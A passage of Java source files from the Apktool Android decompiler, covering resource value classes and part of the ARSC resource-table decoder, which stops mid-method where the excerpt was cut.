`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResIntValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import android.util.TypedValue;
import brut.androlib.AndrolibException;

public class ResIntValue extends ResScalarValue {
    protected final int mValue;
    private int type;

    public ResIntValue(int value, String rawValue, int type) {
        this(value, rawValue, "integer");
        this.type = type;
    }

    public ResIntValue(int value, String rawValue, String type) {
        super(type, value, rawValue);
        this.mValue = value;
    }

    public int getValue() {
        return mValue;
    }

    @Override
    protected String encodeAsResXml() throws AndrolibException {
        return TypedValue.coerceToString(type, mValue);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResPluralsValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.AndrolibException;
import brut.androlib.res.data.ResResource;
import brut.androlib.res.xml.ResValuesXmlSerializable;
import brut.androlib.res.xml.ResXmlEncoders;
import brut.util.Duo;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;

public class ResPluralsValue extends ResBagValue implements
        ResValuesXmlSerializable {
    ResPluralsValue(ResReferenceValue parent,
                    Duo<Integer, ResScalarValue>[] items) {
        super(parent);

        mItems = new ResScalarValue[6];
        for (Duo<Integer, ResScalarValue> item : items) {
            mItems[item.m1 - BAG_KEY_PLURALS_START] = item.m2;
        }
    }

    @Override
    public void serializeToResValuesXml(XmlSerializer serializer,
                                        ResResource res) throws IOException, AndrolibException {
        serializer.startTag(null, "plurals");
        serializer.attribute(null, "name", res.getResSpec().getName());
        for (int i = 0; i < mItems.length; i++) {
            ResScalarValue item = mItems[i];
            if (item == null) {
                continue;
            }

            serializer.startTag(null, "item");
            serializer.attribute(null, "quantity", QUANTITY_MAP[i]);
            serializer.text(ResXmlEncoders.enumerateNonPositionalSubstitutionsIfRequired(item.encodeAsResXmlNonEscapedItemValue()));
            serializer.endTag(null, "item");
        }
        serializer.endTag(null, "plurals");
    }

    private final ResScalarValue[] mItems;

    public static final int BAG_KEY_PLURALS_START = 0x01000004;
    public static final int BAG_KEY_PLURALS_END = 0x01000009;
    private static final String[] QUANTITY_MAP = new String[] { "other", "zero", "one", "two", "few", "many" };
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResReferenceValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.AndrolibException;
import brut.androlib.err.UndefinedResObjectException;
import brut.androlib.res.data.ResPackage;
import brut.androlib.res.data.ResResSpec;

public class ResReferenceValue extends ResIntValue {
    private final ResPackage mPackage;
    private final boolean mTheme;

    public ResReferenceValue(ResPackage package_, int value, String rawValue) {
        this(package_, value, rawValue, false);
    }

    public ResReferenceValue(ResPackage package_, int value, String rawValue,
                             boolean theme) {
        super(value, rawValue, "reference");
        mPackage = package_;
        mTheme = theme;
    }

    @Override
    protected String encodeAsResXml() throws AndrolibException {
        if (isNull()) {
            return "@null";
        }

        ResResSpec spec = getReferent();
        if (spec == null) {
            return "@null";
        }
        boolean newId = spec.hasDefaultResource() && spec.getDefaultResource().getValue() instanceof ResIdValue;

        // generate the beginning to fix @android
        String mStart = (mTheme ? '?' : '@') + (newId ? "+" : "");

        return mStart + spec.getFullName(mPackage, mTheme && spec.getType().getName().equals("attr"));
    }

    public ResResSpec getReferent() throws AndrolibException {
        try {
            return mPackage.getResTable().getResSpec(getValue());
        } catch (UndefinedResObjectException ex) {
            return null;
        }
    }

    public boolean isNull() {
        return mValue == 0;
    }

    public boolean referentIsNull() throws AndrolibException {
        return getReferent() == null;
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResScalarValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.AndrolibException;
import brut.androlib.res.data.ResResource;
import brut.androlib.res.xml.ResValuesXmlSerializable;
import brut.androlib.res.xml.ResXmlEncodable;
import brut.androlib.res.xml.ResXmlEncoders;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;

public abstract class ResScalarValue extends ResIntBasedValue implements
        ResXmlEncodable, ResValuesXmlSerializable {
    protected final String mType;
    protected final String mRawValue;

    protected ResScalarValue(String type, int rawIntValue, String rawValue) {
        super(rawIntValue);
        mType = type;
        mRawValue = rawValue;
    }

    @Override
    public String encodeAsResXmlAttr() throws AndrolibException {
        if (mRawValue != null) {
            return mRawValue;
        }
        return encodeAsResXml();
    }

    public String encodeAsResXmlItemValue() throws AndrolibException {
        return encodeAsResXmlValue();
    }

    @Override
    public String encodeAsResXmlValue() throws AndrolibException {
        if (mRawValue != null) {
            return mRawValue;
        }
        return encodeAsResXml();
    }

    public String encodeAsResXmlNonEscapedItemValue() throws AndrolibException {
        return encodeAsResXmlValue().replace("&amp;", "&").replace("&lt;","<");
    }

    public boolean hasMultipleNonPositionalSubstitutions() {
        return ResXmlEncoders.hasMultipleNonPositionalSubstitutions(mRawValue);
    }

    @Override
    public void serializeToResValuesXml(XmlSerializer serializer,
                                        ResResource res) throws IOException, AndrolibException {
        String type = res.getResSpec().getType().getName();
        boolean item = !"reference".equals(mType) && !type.equals(mType);

        String body = encodeAsResXmlValue();

        // check for resource reference
        if (!type.equalsIgnoreCase("color")) {
            if (body.contains("@")) {
                if (!res.getFilePath().contains("string")) {
                    item = true;
                }
            }
        }

        // Dummy attributes should be <item> with type attribute
        if (res.getResSpec().isDummyResSpec()) {
            item = true;
        }

        // Android does not allow values (false) for ids.xml anymore
        // https://issuetracker.google.com/issues/80475496
        // But it decodes as a ResBoolean, which makes no sense. So force it to empty
        if (type.equalsIgnoreCase("id") && !body.isEmpty()) {
            body = "";
        }

        // check for using attrib as node or item
        String tagName = item ? "item" : type;

        serializer.startTag(null, tagName);
        if (item) {
            serializer.attribute(null, "type", type);
        }
        serializer.attribute(null, "name", res.getResSpec().getName());

        serializeExtraXmlAttrs(serializer, res);

        if (!body.isEmpty()) {
            serializer.ignorableWhitespace(body);
        }

        serializer.endTag(null, tagName);
    }

    public String getType() {
        return mType;
    }

    protected void serializeExtraXmlAttrs(XmlSerializer serializer,
                                          ResResource res) throws IOException {
    }

    protected abstract String encodeAsResXml() throws AndrolibException;
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResStringValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.AndrolibException;
import brut.androlib.res.data.ResResource;
import brut.androlib.res.xml.ResXmlEncoders;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.regex.Pattern;

public class ResStringValue extends ResScalarValue {

    public ResStringValue(String value, int rawValue) {
        this(value, rawValue, "string");
    }

    public ResStringValue(String value, int rawValue, String type) {
        super(type, rawValue, value);
    }

    @Override
    public String encodeAsResXmlAttr() {
        return checkIfStringIsNumeric(ResXmlEncoders.encodeAsResXmlAttr(mRawValue));
    }

    @Override
    public String encodeAsResXmlItemValue() {
        return ResXmlEncoders.enumerateNonPositionalSubstitutionsIfRequired(ResXmlEncoders.encodeAsXmlValue(mRawValue));
    }

    @Override
    public String encodeAsResXmlValue() {
        return ResXmlEncoders.encodeAsXmlValue(mRawValue);
    }

    @Override
    protected String encodeAsResXml() throws AndrolibException {
        throw new UnsupportedOperationException();
    }

    @Override
    protected void serializeExtraXmlAttrs(XmlSerializer serializer, ResResource res) throws IOException {
        if (ResXmlEncoders.hasMultipleNonPositionalSubstitutions(mRawValue)) {
            serializer.attribute(null, "formatted", "false");
        }
    }

    private String checkIfStringIsNumeric(String val) {
        if (val == null || val.isEmpty()) {
            return val;
        }
        return allDigits.matcher(val).matches() ? "\\ " + val : val;
    }

    private static final Pattern allDigits = Pattern.compile("\\d{9,}");
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResStyleValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import brut.androlib.AndrolibException;
import brut.androlib.res.data.ResResSpec;
import brut.androlib.res.data.ResResource;
import brut.androlib.res.xml.ResValuesXmlSerializable;
import brut.util.Duo;
import org.xmlpull.v1.XmlSerializer;

import java.io.IOException;
import java.util.logging.Logger;

public class ResStyleValue extends ResBagValue implements
        ResValuesXmlSerializable {
    ResStyleValue(ResReferenceValue parent,
                  Duo<Integer, ResScalarValue>[] items, ResValueFactory factory) {
        super(parent);

        mItems = new Duo[items.length];
        for (int i = 0; i < items.length; i++) {
            mItems[i] = new Duo<>(
                factory.newReference(items[i].m1, null), items[i].m2);
        }
    }

    @Override
    public void serializeToResValuesXml(XmlSerializer serializer,
                                        ResResource res) throws IOException, AndrolibException {
        serializer.startTag(null, "style");
        serializer.attribute(null, "name", res.getResSpec().getName());
        if (!mParent.isNull() && !mParent.referentIsNull()) {
            serializer.attribute(null, "parent", mParent.encodeAsResXmlAttr());
        } else if (res.getResSpec().getName().indexOf('.') != -1) {
            serializer.attribute(null, "parent", "");
        }
        for (Duo<ResReferenceValue, ResScalarValue> mItem : mItems) {
            ResResSpec spec = mItem.m1.getReferent();

            if (spec == null) {
                LOGGER.fine(String.format("null reference: m1=0x%08x(%s), m2=0x%08x(%s)",
                    mItem.m1.getRawIntValue(), mItem.m1.getType(), mItem.m2.getRawIntValue(), mItem.m2.getType()));
                continue;
            }

            String name;
            String value = null;

            ResValue resource = spec.getDefaultResource().getValue();
            if (resource instanceof ResReferenceValue) {
                continue;
            } else if (resource instanceof ResAttr) {
                ResAttr attr = (ResAttr) resource;
                value = attr.convertToResXmlFormat(mItem.m2);
                name = spec.getFullName(res.getResSpec().getPackage(), true);
            } else {
                name = "@" + spec.getFullName(res.getResSpec().getPackage(), false);
            }

            if (value == null) {
                value = mItem.m2.encodeAsResXmlValue();
            }

            if (value == null) {
                continue;
            }

            serializer.startTag(null, "item");
            serializer.attribute(null, "name", name);
            serializer.text(value);
            serializer.endTag(null, "item");
        }
        serializer.endTag(null, "style");
    }

    private final Duo<ResReferenceValue, ResScalarValue>[] mItems;

    private static final Logger LOGGER = Logger.getLogger(ResStyleValue.class.getName());
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResValue.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

public class ResValue {

}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/data/value/ResValueFactory.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.data.value;

import android.util.TypedValue;
import brut.androlib.AndrolibException;
import brut.androlib.res.data.ResPackage;
import brut.androlib.res.data.ResTypeSpec;
import brut.util.Duo;

public class ResValueFactory {
    private final ResPackage mPackage;

    public ResValueFactory(ResPackage package_) {
        this.mPackage = package_;
    }

    public ResScalarValue factory(int type, int value, String rawValue) throws AndrolibException {
        switch (type) {
            case TypedValue.TYPE_NULL:
                if (value == TypedValue.DATA_NULL_UNDEFINED) { // Special case $empty as explicitly defined empty value
                    return new ResStringValue(null, value);
                } else if (value == TypedValue.DATA_NULL_EMPTY) {
                    return new ResEmptyValue(value, rawValue, type);
                }
                return new ResReferenceValue(mPackage, 0, null);
            case TypedValue.TYPE_REFERENCE:
                return newReference(value, null);
            case TypedValue.TYPE_ATTRIBUTE:
            case TypedValue.TYPE_DYNAMIC_ATTRIBUTE:
                return newReference(value, rawValue, true);
            case TypedValue.TYPE_STRING:
                return new ResStringValue(rawValue, value);
            case TypedValue.TYPE_FLOAT:
                return new ResFloatValue(Float.intBitsToFloat(value), value, rawValue);
            case TypedValue.TYPE_DIMENSION:
                return new ResDimenValue(value, rawValue);
            case TypedValue.TYPE_FRACTION:
                return new ResFractionValue(value, rawValue);
            case TypedValue.TYPE_INT_BOOLEAN:
                return new ResBoolValue(value != 0, value, rawValue);
            case TypedValue.TYPE_DYNAMIC_REFERENCE:
                return newReference(value, rawValue);
        }

        if (type >= TypedValue.TYPE_FIRST_COLOR_INT && type <= TypedValue.TYPE_LAST_COLOR_INT) {
            return new ResColorValue(value, rawValue);
        }
        if (type >= TypedValue.TYPE_FIRST_INT && type <= TypedValue.TYPE_LAST_INT) {
            return new ResIntValue(value, rawValue, type);
        }

        throw new AndrolibException("Invalid value type: " + type);
    }

    public ResIntBasedValue factory(String value, int rawValue) {
        if (value == null) {
            return new ResFileValue("", rawValue);
        }
        if (value.startsWith("res/")) {
            return new ResFileValue(value, rawValue);
        }
        if (value.startsWith("r/") || value.startsWith("R/")) { //AndroResGuard
            return new ResFileValue(value, rawValue);
        }
        return new ResStringValue(value, rawValue);
    }

    public ResBagValue bagFactory(int parent, Duo<Integer, ResScalarValue>[] items, ResTypeSpec resTypeSpec) throws AndrolibException {
        ResReferenceValue parentVal = newReference(parent, null);

        if (items.length == 0) {
            return new ResBagValue(parentVal);
        }
        int key = items[0].m1;
        if (key == ResAttr.BAG_KEY_ATTR_TYPE) {
            return ResAttr.factory(parentVal, items, this, mPackage);
        }

        String resTypeName = resTypeSpec.getName();

        // Android O Preview added an unknown enum for c. This is hardcoded as 0 for now.
        if (ResTypeSpec.RES_TYPE_NAME_ARRAY.equals(resTypeName)
                || key == ResArrayValue.BAG_KEY_ARRAY_START || key == 0) {
            return new ResArrayValue(parentVal, items);
        }

        if (ResTypeSpec.RES_TYPE_NAME_PLURALS.equals(resTypeName) ||
                (key >= ResPluralsValue.BAG_KEY_PLURALS_START && key <= ResPluralsValue.BAG_KEY_PLURALS_END)) {
            return new ResPluralsValue(parentVal, items);
        }

        if (ResTypeSpec.RES_TYPE_NAME_STYLES.equals(resTypeName)) {
            return new ResStyleValue(parentVal, items, this);
        }

        if (ResTypeSpec.RES_TYPE_NAME_ATTR.equals(resTypeName)) {
            return new ResAttr(parentVal, 0, null, null, null);
        }

        throw new AndrolibException("unsupported res type name for bags. Found: " + resTypeName);
    }

    public ResReferenceValue newReference(int resID, String rawValue) {
        return newReference(resID, rawValue, false);
    }

    public ResReferenceValue newReference(int resID, String rawValue, boolean theme) {
        return new ResReferenceValue(mPackage, resID, rawValue, theme);
    }
}

```

`brut.apktool/apktool-lib/src/main/java/brut/androlib/res/decoder/ARSCDecoder.java`:

```java
/*
 *  Copyright (C) 2010 Ryszard Wiśniewski <brut.alll@gmail.com>
 *  Copyright (C) 2010 Connor Tumbleson <connor.tumbleson@gmail.com>
 *
 *  Licensed under the Apache License, Version 2.0 (the "License");
 *  you may not use this file except in compliance with the License.
 *  You may obtain a copy of the License at
 *
 *       https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing, software
 *  distributed under the License is distributed on an "AS IS" BASIS,
 *  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 *  See the License for the specific language governing permissions and
 *  limitations under the License.
 */
package brut.androlib.res.decoder;

import android.util.TypedValue;
import brut.androlib.AndrolibException;
import brut.androlib.res.data.*;
import brut.androlib.res.data.value.*;
import brut.util.Duo;
import brut.util.ExtDataInput;
import com.google.common.io.LittleEndianDataInputStream;
import org.apache.commons.io.input.CountingInputStream;

import java.io.DataInput;
import java.io.EOFException;
import java.io.IOException;
import java.io.InputStream;
import java.math.BigInteger;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.List;
import java.util.logging.Logger;

public class ARSCDecoder {
    public static ARSCData decode(InputStream arscStream, boolean findFlagsOffsets, boolean keepBroken)
            throws AndrolibException {
        return decode(arscStream, findFlagsOffsets, keepBroken, new ResTable());
    }

    public static ARSCData decode(InputStream arscStream, boolean findFlagsOffsets, boolean keepBroken,
                                  ResTable resTable)
            throws AndrolibException {
        try {
            ARSCDecoder decoder = new ARSCDecoder(arscStream, resTable, findFlagsOffsets, keepBroken);
            ResPackage[] pkgs = decoder.readTableHeader();
            return new ARSCData(pkgs, decoder.mFlagsOffsets == null
                    ? null
                    : decoder.mFlagsOffsets.toArray(new FlagsOffset[0]), resTable);
        } catch (IOException ex) {
            throw new AndrolibException("Could not decode arsc file", ex);
        }
    }

    private ARSCDecoder(InputStream arscStream, ResTable resTable, boolean storeFlagsOffsets, boolean keepBroken) {
        arscStream = mCountIn = new CountingInputStream(arscStream);
        if (storeFlagsOffsets) {
            mFlagsOffsets = new ArrayList<>();
        } else {
            mFlagsOffsets = null;
        }
        // We need to explicitly cast to DataInput as otherwise the constructor is ambiguous.
        // We choose DataInput instead of InputStream as ExtDataInput wraps an InputStream in
        // a DataInputStream which is big-endian and ignores the little-endian behavior.
        mIn = new ExtDataInput((DataInput) new LittleEndianDataInputStream(arscStream));
        mResTable = resTable;
        mKeepBroken = keepBroken;
    }

    private ResPackage[] readTableHeader() throws IOException, AndrolibException {
        nextChunkCheckType(Header.TYPE_TABLE);
        int packageCount = mIn.readInt();

        mTableStrings = StringBlock.read(mIn);
        ResPackage[] packages = new ResPackage[packageCount];

        nextChunk();
        for (int i = 0; i < packageCount; i++) {
            mTypeIdOffset = 0;
            packages[i] = readTablePackage();
        }
        return packages;
    }

    private ResPackage readTablePackage() throws IOException, AndrolibException {
        checkChunkType(Header.XML_TYPE_PACKAGE);
        int id = mIn.readInt();

        if (id == 0) {
            // This means we are dealing with a Library Package, we should just temporarily
            // set the packageId to the next available id . This will be set at runtime regardless, but
            // for Apktool's use we need a non-zero packageId.
            // AOSP indicates 0x02 is next, as 0x01 is system and 0x7F is private.
            id = 2;
            if (mResTable.getPackageOriginal() == null && mResTable.getPackageRenamed() == null) {
                mResTable.setSharedLibrary(true);
            }
        }

        String name = mIn.readNullEndedString(128, true);
        /* typeStrings */mIn.skipInt();
        /* lastPublicType */mIn.skipInt();
        /* keyStrings */mIn.skipInt();
        /* lastPublicKey */mIn.skipInt();

        // TypeIdOffset was added platform_frameworks_base/@f90f2f8dc36e7243b85e0b6a7fd5a590893c827e
        // which is only in split/new applications.
        int splitHeaderSize = (2 + 2 + 4 + 4 + (2 * 128) + (4 * 5)); // short, short, int, int, char[128], int * 4
        if (mHeader.headerSize == splitHeaderSize) {
            mTypeIdOffset = mIn.readInt();
        }

        if (mTypeIdOffset > 0) {
            LOGGER.warning("Please report this application to Apktool for a fix: https://github.com/iBotPeaches/Apktool/issues/1728");
        }

        mTypeNames = StringBlock.read(mIn);
        mSpecNames = StringBlock.read(mIn);

        mResId = id << 24;
        mPkg = new ResPackage(mResTable, id, name);

        nextChunk();
        boolean flag = true;
        while (flag) {
            switch (mHeader.type) {
                case Header.XML_TYPE_SPEC_TYPE:
                    readTableTypeSpec();
                    break;
                case Header.XML_TYPE_LIBRARY:
                    readLibraryType();
                    break;
                case Header.XML_TYPE_OVERLAY:
                    readOverlaySpec();
                    break;
                case Header.XML_TYPE_STAGED_ALIAS:
                    readStagedAliasSpec();
                    break;
                default:
                    flag = false;
                    break;
            }
        }

        return mPkg;
    }

    private void readLibraryType() throws AndrolibException, IOException {
        checkChunkType(Header.XML_TYPE_LIBRARY);
        int libraryCount = mIn.readInt();

        int packageId;
        String packageName;

        for (int i = 0; i < libraryCount; i++) {
            packageId = mIn.readInt();
            packageName = mIn.readNullEndedString(128, true);
            LOGGER.info(String.format("Decoding Shared Library (%s), pkgId: %d", packageName, packageId));
        }

        while(nextChunk().type == Header.XML_TYPE_TYPE) {
            readTableTypeSpec();
        }
    }

    private void readStagedAliasSpec() throws IOException {
        int count = mIn.readInt();

        for (int i = 0; i < count; i++) {
            LOGGER.fine(String.format("Skipping staged alias stagedId (%h) finalId: %h", mIn.readInt(), mIn.readInt()));
        }

        nextChunk();
    }

    private void readOverlaySpec() throws IOException {
        /* policyFlags */mIn.skipInt();
        int count = mIn.readInt();

        for (int i = 0; i < count; i++) {
            LOGGER.fine(String.format("Skipping overlay (%h)", mIn.readInt()));
        }

        nextChunk();
    }

    private void readTableTypeSpec() throws AndrolibException, IOException {
        mTypeSpec = readSingleTableTypeSpec();
        addTypeSpec(mTypeSpec);

        int type = nextChunk().type;
        ResTypeSpec resTypeSpec;

        while (type == Header.XML_TYPE_SPEC_TYPE) {
            resTypeSpec = readSingleTableTypeSpec();
            addTypeSpec(resTypeSpec);
            type = nextChunk().type;

            // We've detected sparse resources, lets record this so we can rebuild in that same format (sparse/not)
            // with aapt2. aapt1 will ignore this.
            if (! mResTable.getSparseResources()) {
                mResTable.setSparseResources(true);
            }
        }

        while (type == Header.XML_TYPE_TYPE) {
            readTableType();

            // skip "TYPE 8 chunks" and/or padding data at the end of this chunk
            if (mCountIn.getCount() < mHeader.endPosition) {
                LOGGER.warning("Unknown data detected. Skipping: " + (mHeader.endPosition - mCountIn.getCount()) + " byte(s)");
                mCountIn.skip(mHeader.endPosition - mCountIn.getCount());
            }

            type = nextChunk().type;

            addMissingResSpecs();
        }
    }

    private ResTypeSpec readSingleTableTypeSpec() throws AndrolibException, IOException {
        checkChunkType(Header.XML_TYPE_SPEC_TYPE);
        int id = mIn.readUnsignedByte();
        mIn.skipBytes(3);
        int entryCount = mIn.readInt();

        if (mFlagsOffsets != null) {
            mFlagsOffsets.add(new FlagsOffset(mCountIn.getCount(), entryCount));
        }

		/* flags */mIn.skipBytes(entryCount * 4);
        mTypeSpec = new ResTypeSpec(mTypeNames.getString(id - 1), mResTable, mPkg, id, entryCount);
        mPkg.addType(mTypeSpec);
        return mTypeSpec;
    }

    private ResType readTableType() throws IOException, AndrolibException {
        checkChunkType(Header.XML_TYPE_TYPE);
        int typeId = mIn.readUnsignedByte() - mTypeIdOffset;
        if (mResTypeSpecs.containsKey(typeId)) {
            mResId = (0xff000000 & mResId) | mResTypeSpecs.get(typeId).getId() << 16;
            mTypeSpec = mResTypeSpecs.get(typeId);
        }

        int typeFlags = mIn.readByte();
        /* reserved */mIn.skipBytes(2);
        int entryCount = mIn.readInt();
        int entriesStart = mIn.readInt();
        mMissingResSpecs = new boolean[entryCount];
        Arrays.fill(mMissingResSpecs, true);

        ResConfigFlags flags = readConfigFlags();
        int position = (mHeader.startPosition + entriesStart) - (entryCount * 4);

        // For some APKs there is a disconnect between the reported size of Configs
        // If we find a mismatch skip those bytes.
        if (position != mCountIn.getCount()) {
            LOGGER.warning("Invalid data detected. Skipping: " + (position - mCountIn.getCount()) + " byte(s)");
            mIn.skipBytes(position - mCountIn.getCount());
        }

        if (typeFlags == 1) {
            LOGGER.info("Sparse type flags detected: " + mTypeSpec.getName());
        }
        int[] entryOffsets = mIn.readIntArray(entryCount);

        if (flags.isInvalid) {
            String resName = mTypeSpec.getName() + flags.getQualifiers();
            if (mKeepBroken) {
                LOGGER.warning("Invalid config flags detected: " + resName);
            } else {
                LOGGER.warning("Invalid config flags detected. Dropping resources: " + resName);
            }
        }

        mType = flags.isInvalid && !mKeepBroken ? null : mPkg.getOrCreateConfig(flags);
        HashMap<Integer, EntryData> offsetsToEntryData = new HashMap<>();

        for (int offset : entryOffsets) {
            if (offset == -1 || offsetsToEntryData.containsKey(offset)) {
                continue;
            }

            offsetsToEntryData.put(offset, readEntryData());
        }

        for (int i = 0; i < entryOffsets.length; i++) {
            if (entryOffsets[i] != -1) {
                mMissingResSpecs[i] = false;
                mResId = (mResId & 0xffff0000) | i;
                EntryData entryData = offsetsToEntryData.get(entryOffsets[i]);
                readEntry(entryData);
            }
        }

        return mType;
    }


    private EntryData readEntryData() throws IOException, AndrolibException {
        short size = mIn.readShort();
        if (size < 0) {
            throw new AndrolibException("Entry size is under 0 bytes.");
        }

        short flags = mIn.readShort();
        int specNamesId = mIn.readInt();
        ResValue value = (flags & ENTRY_FLAG_COMPLEX) == 0 ? readValue() : readComplexEntry();
        EntryData entryData = new EntryData();
        entryData.mFlags = flags;
        entryData.mSpecNamesId = specNamesId;
        entryData.mValue = value;
        return entryData;
    }

    private void readEntry(EntryData entryData) throws AndrolibException {
        int specNamesId = entryData.mSpecNamesId;
        ResValue value = entryData.mValue;

        if (mTypeSpec.isString() && value instanceof ResFileValue) {
            value = new ResStringValue(value.toString(), ((ResFileValue) value).getRawIntValue());
        }
        if (mType == null) {
            return;
        }

        ResID resId = new ResID(mResId);
        ResResSpec spec;
        if (mPkg.hasResSpec(resId)) {
            spec = mPkg.getResSpec(resId);

            if (spec.isDummyResSpec()) {
                removeResSpec(spec);

                spec = new ResResSpec(resId, mSpecNames.getString(specNamesId), mPkg, mTypeSpec);
                mPkg.addResSpec(spec);
                mTypeSpec.addResSpec(spec);
            }
        } else {
            spec = new ResResSpec(resId, mSpecNames.getString(specNamesId), mPkg, mTypeSpec);
            mPkg.addResSpec(spec);
            mTypeSpec.addResSpec(spec);
        }
        ResResource res = new ResResource(mType, spec, value);

        try {
            mType.addResource(res);
            spec.addResource(res);
        } catch (AndrolibException ex) {
            if (mKeepBroken) {
                mType.addResource(res, true);
                spec.addResource(res, true);
                LOGGER.warning(String.format("Duplicate Resource Detected. Ignoring duplicate: %s", res));
            } else {
                throw ex;
            }
        }
    }

    private ResBagValue readComplexEntry() throws IOException, AndrolibException {
        int parent = mIn.readInt();
        int count = mIn.readInt();

        ResValueFactory factory = mPkg.getValueFactory();
        Duo<Integer, ResScalarValue>[] items = new Duo[count];
        ResIntBasedValue resValue;
        int resId;

        for (int i = 0; i < count; i++) {
            resId = mIn.readInt();
            resValue = readValue();

            if (!(resValue instanceof ResScalarValue)) {
                resValue = new ResStringValue(resValue.toString(), resValue.getRawIntValue());
            }
